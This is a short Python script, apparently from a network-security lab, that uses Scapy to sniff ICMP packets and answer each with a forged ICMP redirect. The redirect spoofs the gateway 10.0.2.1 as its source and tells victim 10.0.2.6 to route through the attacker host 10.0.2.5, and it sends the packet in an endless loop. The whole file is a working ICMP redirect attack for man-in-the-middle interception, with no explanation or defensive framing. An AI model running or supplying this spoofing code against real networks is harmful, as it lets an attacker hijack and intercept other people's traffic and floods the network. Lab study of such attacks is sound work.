#!/usr/bin/python3
from scapy.all import *

def print_pkt(pkt):
      print("source ip",pkt[IP].src)
      print("dst ip",pkt[IP].dst)
      ip = IP()
      ip.src='10.0.2.1' #gateway
      ip.dst='10.0.2.6'
      icmp = ICMP()
      icmp.type = 5
      icmp.code = 1
      icmp.gw = '10.0.2.5' #local_attacker
      ip2 = IP()
      ip2.src=pkt[IP].src
      ip2.dst=pkt[IP].dst
      forgepkt = ip/icmp/ip2/UDP()
      while 1:
          send(forgepkt, verbose=0)
sniff(filter='icmp',prn=print_pkt)
